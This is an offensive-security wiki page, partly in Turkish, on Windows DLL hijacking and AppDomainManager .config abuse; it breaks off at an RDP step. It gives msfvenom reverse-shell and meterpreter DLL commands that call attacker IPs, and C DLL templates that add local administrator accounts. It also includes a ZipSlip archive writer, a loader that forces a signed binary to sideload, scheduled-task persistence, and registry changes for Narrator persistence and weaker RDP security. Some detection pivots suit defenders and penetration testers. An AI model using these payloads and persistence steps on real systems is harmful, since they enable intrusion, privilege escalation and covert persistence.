# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking, güvenilir bir uygulamayı zararlı bir DLL yükleyecek şekilde manipüle etmeyi içerir. Bu terim, **DLL Spoofing, Injection ve Side-Loading** gibi birkaç taktiği kapsar. Temelde code execution, persistence elde etmek ve daha nadir olarak privilege escalation için kullanılır. Burada escalation'a odaklanılsa da, hijacking yöntemi hedeflerden bağımsız olarak tutarlıdır.

### Common Techniques

DLL hijacking için çeşitli yöntemler kullanılır; her birinin etkinliği, uygulamanın DLL loading stratejisine bağlıdır:

1. **DLL Replacement**: Gerçek bir DLL'yi zararlı bir DLL ile değiştirmek; isteğe bağlı olarak orijinal DLL'nin işlevselliğini korumak için DLL Proxying kullanılır.
2. **DLL Search Order Hijacking**: Zararlı DLL'yi, arama yolunda meşru olanın önüne yerleştirmek ve uygulamanın search pattern'ini istismar etmek.
3. **Phantom DLL Hijacking**: Bir uygulamanın yüklemesi için, var olmayan gerekli bir DLL olduğunu düşünerek zararlı bir DLL oluşturmak.
4. **DLL Redirection**: Uygulamayı zararlı DLL'ye yönlendirmek için `%PATH%` veya `.exe.manifest` / `.exe.local` dosyaları gibi arama parametrelerini değiştirmek.
5. **WinSxS DLL Replacement**: Meşru DLL'yi, WinSxS dizininde zararlı bir karşılığı ile değiştirmek; bu yöntem genellikle DLL side-loading ile ilişkilidir.
6. **Relative Path DLL Hijacking**: Zararlı DLL'yi, kopyalanmış uygulama ile birlikte kullanıcı kontrollü bir dizine yerleştirmek; Binary Proxy Execution tekniklerine benzer.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasik DLL sideloading, güvenilir bir **.NET Framework** sürecine attacker code yükletmenin tek yolu değildir. Hedef executable bir **managed** uygulamaysa, CLR ayrıca executable ile aynı adı taşıyan bir **application configuration file**'ı da kontrol eder (örneğin `Setup.exe.config`). Bu dosya özel bir **AppDomainManager** tanımlayabilir. Eğer config, EXE'nin yanına yerleştirilmiş attacker-controlled bir assembly'ye işaret ederse, CLR onu **uygulamanın normal code path'inden önce** yükler ve güvenilir process içinde çalıştırır.

Microsoft'un .NET Framework configuration schema'sına göre, özel manager'ın kullanılabilmesi için hem `<appDomainManagerAssembly>` hem de `<appDomainManagerType>` bulunmalıdır.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal yönetici:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Practical notes:
- This is **.NET Framework specific** tradecraft. It depends on CLR config parsing, not on the Win32 DLL search order.
- The host must really be a **managed EXE**. Quick triage: `sigcheck -m target.exe`, `corflags target.exe`, or check for the **CLR Runtime Header** in PE metadata.
- The config filename must match the executable name exactly (`<binary>.config`) and usually lives **next to the EXE**.
- This is useful with **signed Microsoft/vendor binaries** because the trusted EXE remains untouched while the malicious managed assembly executes in-process.
- If you already have a writable installer/update directory, AppDomainManager hijacking can be used as the **first stage**, followed by classic DLL sideloading or reflective loading for later stages.

### AppDomainManager as a downloader + scheduled-task bootstrap

A practical intrusion pattern is to pair the trusted managed EXE with both a malicious `*.config` and a malicious AppDomainManager DLL that acts only as a **small bootstrapper**:

1. User launches a signed .NET installer or updater from a believable location such as `%USERPROFILE%\Downloads`.
2. The adjacent config causes the CLR to load the attacker assembly **before** the legitimate app logic starts.
3. The malicious manager performs a **path gate** (for example, only continue if the host EXE is running from `Downloads`, and only let the second stage run from `%LOCALAPPDATA%`).
4. If the check passes, it downloads the real payload into a user-writable path such as `%LOCALAPPDATA%\PerfWatson2.exe` and installs persistence with a scheduled task.

Why this variant matters:
- The signed host EXE stays unchanged, so triage that only hashes the main binary may miss the compromise.
- Simple **path-based anti-analysis** is common: moving the ZIP/EXE/DLL triad to Desktop, Temp, or a sandbox path can intentionally break the chain.
- The first-stage AppDomainManager DLL can stay tiny and low-noise while the real implant is fetched later.

Minimal persistence example frequently seen with this pattern:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notlar:
- ` /rl highest` **highest available** anlamına gelir; bu, tek başına o kullanıcı/oturum için garantili bir SYSTEM escalation değildir.
- Bu teknik çoğu zaman klasik missing-DLL search-order hijacking yerine **.NET config abuse üzerinden execution/persistence** olarak daha iyi sınıflandırılır; ancak operatörler sık sık ikisini birlikte chain eder.

Detection pivots:
- **ZIP extraction paths**, `Downloads`, `%TEMP%` veya diğer user-writable klasörlerden başlatılan ve yanında `<exe>.config` bulunan signed .NET executables.
- Eylemi `%LOCALAPPDATA%`, `%APPDATA%` veya `Downloads` içine işaret eden ve adları browser/vendor updaters taklit eden yeni scheduled tasks.
- Hemen başka bir EXE download eden, ardından `schtasks.exe` başlatan kısa ömürlü managed bootstrap processes.
- Executable path beklenen user-profile directory ile eşleşmediği sürece erken çıkan samples.

### Mevcut bir scheduled task'ı hijack ederek sideload chain'i yeniden başlatma

Persistence için yalnızca **yeni bir task oluşturmayı** aramayın. Bazı intrusion setler meşru bir installer’ın bir **normal updater task** oluşturmasını bekler ve sonra defenders için tanıdık kalan mevcut name, author ve trigger’ı koruyacak şekilde **task action'ı yeniden yazar**.

Yeniden kullanılabilir workflow:
1. Meşru software’i install/run edin ve normalde oluşturduğu task’ı belirleyin.
2. Task XML'ini export edin ve mevcut `<Exec><Command>` / `<Arguments>` değerlerini not edin.
3. Yalnızca action'ı değiştirin; böylece task, user-writable bir staging directory içindeki **trusted host EXE**'nizi başlatır, ardından gerçek payload'ı side-load eder veya AppDomain-load eder.
4. Yeni, belirgin bir persistence artifact oluşturmak yerine aynı task name'i yeniden register edin.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Neden daha stealthy olduğu:
- Task adı hâlâ meşru görünebilir (örneğin bir vendor updater).
- **Task Scheduler service** onu başlattığı için, parent/ancestor doğrulaması çoğu zaman `explorer.exe` yerine beklenen scheduling zincirini görür.
- Sadece **yeni task name** avlayan DFIR ekipleri, kaydı zaten var olan ama action’ı artık `%LOCALAPPDATA%`, `%APPDATA%` veya başka bir attacker-controlled path’e işaret eden bir task’i kaçırabilir.

Hızlı hunting pivotları:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML ve `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata’sını bir baseline ile karşılaştır.
- Bir **vendor-looking updater task** **user-writable directories** içinden çalıştığında veya yanında bulunan `*.config` dosyasıyla bir .NET EXE başlattığında alert üret.

> [!TIP]
> HTML staging, AES-CTR configs ve .NET implants katmanlarını DLL sideloading üzerine ekleyen adım adım zincir için aşağıdaki workflow’u inceleyin.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Eksik Dlls bulma

Bir sistem içinde eksik Dlls bulmanın en yaygın yolu, sysinternals içinden [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırmak ve **aşağıdaki 2 filtreyi** **ayarlamaktır**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

ve sadece **File System Activity**’yi gösterin:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Eğer genel olarak **missing dlls** arıyorsanız bunu birkaç **saniye** boyunca çalışır halde **bırakın**.\
Belirli bir executable içinde **missing dll** arıyorsanız, **"Process Name" "contains" `<exec name>`** gibi başka bir filtre ayarlamalı, onu çalıştırmalı ve event capture’ı durdurmalısınız.

## Missing Dlls exploitation

Privilege escalation yapmak için en iyi şansımız, bir privilege process’in yüklemeye çalışacağı bir **dll yazabilmek** ve bunu aranacağı yerlerden birine koyabilmektir. Bu yüzden, **dll’nin**, **orijinal dll**’nin bulunduğu klasörden **önce** aranacağı bir **klasör**e dll **yazabilecek** durumda olabiliriz (garip durum) ya da dll’nin aranacağı bir klasöre **yazabiliriz** ve orijinal **dll** herhangi bir klasörde **yoktur**.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows applications** look for DLLs by following a set of **pre-defined search paths**, adhering to a particular sequence. The issue of DLL hijacking arises when a harmful DLL is strategically placed in one of these directories, ensuring it gets loaded before the authentic DLL. A solution to prevent this is to ensure the application uses absolute paths when referring to the DLLs it requires.

You can see the **DLL search order on 32-bit** systems below:

1. Uygulamanın yüklendiği directory.
2. System directory. Bu directory’nin path’ini almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function’ını kullanın.(_C:\Windows\System32_)
3. 16-bit system directory. Bu directory’nin path’ini alan bir function yoktur, ancak aranır. (_C:\Windows\System_)
4. Windows directory. Bu directory’nin path’ini almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function’ını kullanın.
1. (_C:\Windows_)
5. Current directory.
6. PATH environment variable içinde listelenen directories. Bunun **App Paths** registry key tarafından belirtilen per-application path’i içermediğini unutmayın. **App Paths** key’i DLL search path hesaplanırken kullanılmaz.

Bu, **SafeDllSearchMode** etkin olduğunda varsayılan search order’dır. Devre dışı bırakıldığında current directory ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value’sunu oluşturun ve 0 olarak ayarlayın (default etkin).

Eğer [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function’ı **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa search, **LoadLibraryEx**’in yüklediği executable module’ün directory’sinde başlar.

Son olarak, **bir dll’nin yalnızca adı yerine absolute path belirtilerek de yüklenebileceğini** unutmayın. Bu durumda o dll **sadece o path** içinde aranır (dll’nin bağımlılıkları varsa, onlar da yeni yüklenmiş gibi isimle aranır).

Search order’ı değiştirmek için başka yollar da vardır, ancak burada onları açıklamayacağım.

### Arbitrary file write’ı missing-DLL hijack’e zincirleme

1. **ProcMon** filtrelerini (`Process Name` = target EXE, `Path` `.dll` ile biter, `Result` = `NAME NOT FOUND`) kullanarak process’in denediği ama bulamadığı DLL isimlerini topla.
2. Binary bir **schedule/service** üzerinde çalışıyorsa, bu isimlerden biriyle bir DLL’i **application directory** içine bırakmak (search-order entry #1) bir sonraki çalıştırmada onu yükletir. Bir .NET scanner vakasında process, gerçek kopyayı `C:\Program Files\dotnet\fxr\...` konumundan yüklemeden önce `hostfxr.dll` dosyasını `C:\samples\app\` içinde arıyordu.
3. Herhangi bir export içeren bir payload DLL oluşturun (ör. reverse shell): `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Primitive’iniz bir **ZipSlip-style arbitrary write** ise, ZIP entry extraction dir’den çıkacak şekilde craft edin; böylece DLL app folder’a düşer:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Arşivi izlenen inbox/share’a teslim et; zamanlanmış görev süreci yeniden başlattığında, malicious DLL yükler ve kodunu service account olarak çalıştırır.

### RTL_USER_PROCESS_PARAMETERS.DllPath üzerinden sideloading zorlamak

Yeni oluşturulan bir process’in DLL search path’ini deterministik olarak etkilemenin gelişmiş bir yolu, ntdll’nin native APIs’si ile process oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Buraya attacker-controlled bir dizin vererek, imported DLL’yi adla çözen bir target process’in (mutlak path olmadan ve safe loading flags kullanmadan) o dizinden malicious DLL yüklemesi zorlanabilir.

Ana fikir
- Process parameters’ı RtlCreateProcessParametersEx ile oluştur ve controlled klasörünü gösteren özel bir DllPath sağla (ör. dropper/unpacker’ın bulunduğu dizin).
- Process’i RtlCreateUserProcess ile oluştur. Target binary bir DLL’yi adla çözdüğünde, loader çözümleme sırasında bu sağlanan DllPath’i kontrol eder; bu da malicious DLL target EXE ile yan yana olmasa bile güvenilir sideloading sağlar.

Notlar/sınırlamalar
- Bu, oluşturulan child process’i etkiler; sadece current process’i etkileyen SetDllDirectory’den farklıdır.
- Target, bir DLL’yi adla import etmeli ya da LoadLibrary kullanmalıdır (mutlak path olmadan ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanmadan).
- KnownDLLs ve hardcoded mutlak path’ler hijack edilemez. Forwarded exports ve SxS önceliği değiştirebilir.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Tam C example: RTL_USER_PROCESS_PARAMETERS.DllPath ile DLL sideloading zorlamak</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- DllPath dizininize gerekli fonksiyonları export eden ya da gerçek olanı proxyleyen kötü amaçlı bir xmllite.dll yerleştirin.
- Yukarıdaki tekniği kullanarak xmllite.dll aradığı bilinen imzalı bir binary çalıştırın. Loader, import'u sağlanan DllPath üzerinden çözer ve DLL'inizi sideload eder.

Bu teknik, multi-stage sideloading zincirlerini tetiklemek için sahada gözlemlenmiştir: ilk launcher bir helper DLL bırakır, ardından custom bir DllPath ile Microsoft-signed, hijack edilebilir bir binary başlatır ve staging directory'den saldırganın DLL'ini yüklemeye zorlar.


### .NET AppDomainManager hijacking via `.exe.config`

**.NET Framework** hedefleri için sideloading, uygulamanın yanındaki **`.exe.config`** dosyasını kötüye kullanarak bellek patch'lemeden **`Main()` öncesinde** yapılabilir. Yalnızca Win32 DLL search order'a güvenmek yerine saldırgan, meşru bir .NET EXE'yi kötü amaçlı bir config ve saldırgan kontrolündeki bir veya daha fazla assembly ile yanına koyar.

Zincir nasıl çalışır:
1. Host EXE başlar ve **CLR `<exe>.config`** dosyasını okur.
2. Config, çalışma zamanının saldırgan kontrollü bir `AppDomainManager` örneklemesi için **`<appDomainManagerAssembly>`** ve **`<appDomainManagerType>`** ayarlar.
3. Kötü amaçlı manager, güvenilir host process içinde **`Main()` öncesi** execution elde eder.
4. Aynı config, CLR'nin local assembly'leri önce resolve etmesini zorlayabilir (örneğin `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) ve inline patching olmadan runtime validation/telemetry'yi zayıflatabilir.

Campaign-style pattern (exact nesting can vary by directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Neden bu faydalı:
- **`<probing privatePath="."/>`** assembly çözümlemesini uygulama dizininde tutar ve klasörü öngörülebilir bir sideloading yüzeyi haline getirir.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** yürütmeyi CLR başlatması sırasında, meşru uygulama mantığı çalışmadan önce, saldırgan koduna taşır.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** tam güvenilir bir app'nin strong-name doğrulama hatası olmadan imzasız veya değiştirilmiş assemblies yüklemesine izin verebilir.
- **`<publisherPolicy apply="no"/>`** publisher-policy yönlendirmelerinden daha yeni assemblies'e kaçınır.
- **`<requiredRuntime ... safemode="true"/>`** runtime seçimini daha deterministik hale getirir.
- **`<etwEnable enabled="false"/>`** özellikle ilginçtir çünkü **CLR kendi ETW görünürlüğünü** yapılandırmadan devre dışı bırakır; implantın bellekte `EtwEventWrite` yamasına gerek kalmaz.

Son kampanyalarda görülen operasyonel desen:
- Stage 1, `setup.exe`, `setup.exe.config` ve yerel assemblies dosyalarını bırakır.
- Stage 2 bunları inandırıcı bir **AppData update** klasörüne kopyalar, host'u `update.exe` gibi bir şeye yeniden adlandırır ve bir **scheduled task** ile tekrar çalıştırır.
- Stage 3 nihai RAT DLL/export'unu yüklemeden önce yürütme bağlamını doğrular (örneğin Task Scheduler'dan beklenen parent `svchost.exe`).

Avlanma fikirleri:
- Kullanıcı-yazılabilir konumlarda şüpheli bitişik **`.config`** dosyalarıyla çalışan imzalı veya başka şekilde meşru **.NET executables**.
- **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** veya **`etwEnable enabled="false"`** içeren `.config` dosyaları.
- Yeniden adlandırılmış update binary'lerini **`%LOCALAPPDATA%`** ya da uygulamaya özel `\bin\update\` dizinlerinden yeniden başlatan scheduled task'lar.
- Scheduled task'ın hemen kendi dizininden vendor dışı assemblies yükleyen güvenilir bir .NET host'u başlattığı parent/child zincirleri.

#### Windows docs'taki dll search order istisnaları

Windows dokümantasyonunda standart DLL search order için bazı istisnalar belirtilir:

- Bellekte zaten yüklü olan biriyle aynı ada sahip bir **DLL** ile karşılaşıldığında, sistem olağan aramayı atlar. Bunun yerine, varsayılan olarak bellekte zaten bulunan DLL'e geçmeden önce redirection ve manifest kontrolü yapar. **Bu senaryoda sistem DLL için bir arama yapmaz**.
- DLL, mevcut Windows sürümü için **known DLL** olarak tanındığında, sistem search sürecini atlayarak known DLL'in kendi sürümünü ve onun dependent DLL'lerini kullanır. Kayıt anahtarı **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bu known DLL'lerin listesini tutar.
- Bir **DLL'nin dependencies**'leri varsa, bu dependent DLL'lerin araması, ilk DLL tam path ile tanımlanmış olsa bile, yalnızca **module names** ile belirtilmiş gibi yapılır.

### Privileges Yükseltme

**Gereksinimler**:

- **Farklı privileges** altında çalışan veya çalışacak olan, **bir DLL'i eksik** bir process belirleyin (horizontal veya lateral movement).
- **DLL**'in **aranacağı** herhangi bir **directory** için **write access** olduğundan emin olun. Bu konum executable'ın dizini veya system path içindeki bir dizin olabilir.

Evet, gereksinimleri bulmak zor, çünkü **varsayılan olarak bir privileged executable'ın eksik bir dll ile bulunması biraz garip** ve bir de **system path klasöründe write permissions** olması daha da garip (**varsayılan olarak yapamazsınız**). Ancak yanlış yapılandırılmış ortamlarda bu mümkündür.\
Şanslıysanız ve gereksinimleri karşılayan bir durum bulursanız, [UACME](https://github.com/hfiref0x/UACME) projesini kontrol edebilirsiniz. Projenin **ana amacı UAC bypass** olsa da, Windows sürümü için kullanabileceğiniz bir Dll hijaking **PoC** bulabilirsiniz (muhtemelen sadece write permissions olan klasörün path'ini değiştirmeniz gerekir).

Bir klasörde **izinlerinizi kontrol edebileceğinizi** not edin:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **check permissions of all folders inside PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bir executable’ın imports ve bir dll’in exports’larını şu şekilde de kontrol edebilirsiniz:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir meterpreter (x86) al:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir kullanıcı oluşturun (x86, x64 sürümünü görmedim):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendi

Bazı durumlarda derlediğiniz Dll, kurban süreç tarafından yüklenecek **birkaç fonksiyonu export etmek** zorundadır; bu fonksiyonlar mevcut değilse **binary onları yükleyemez** ve **exploit başarısız olur**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Kullanıcı oluşturma ile C++ DLL örneği</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Thread giriş noktası ile alternatif C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Vaka İncelemesi: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe, başlangıçta öngörülebilir, dile özgü bir localization DLL için hâlâ sorgulama yapar; bu DLL, arbitrary code execution ve persistence için hijack edilebilir.

Temel bilgiler
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Eğer OneCore path üzerinde yazılabilir, attacker-controlled bir DLL varsa, yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` çalışır. Export gerekmez.

Procmon ile Discovery
- Filter: `Process Name is Narrator.exe` ve `Operation is Load Image` veya `CreateFile`.
- Narrator'ı başlatın ve yukarıdaki path için denenen load işlemini gözlemleyin.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC sessizlik
- Naive bir hijack UI’yi konuşur/vurgular. Sessiz kalmak için attach sırasında Narrator thread’lerini enumerate et, ana thread’i (`OpenThread(THREAD_SUSPEND_RESUME)`) aç ve `SuspendThread` ile durdur; devamı kendi thread’inde olsun. Tam kod için PoC’ye bak.

Accessibility configuration ile tetikleme ve persistence
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Yukarıdakilerle Narrator başlatıldığında eklenen DLL yüklenir. Secure desktop’ta (logon screen), Narrator’ı başlatmak için CTRL+WIN+ENTER’a bas; DLL’in secure desktop üzerinde SYSTEM olarak çalışır.

RDP ile tetiklenen SYSTEM execution (lateral movement)
- Klasik RDP security layer’a izin ver: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
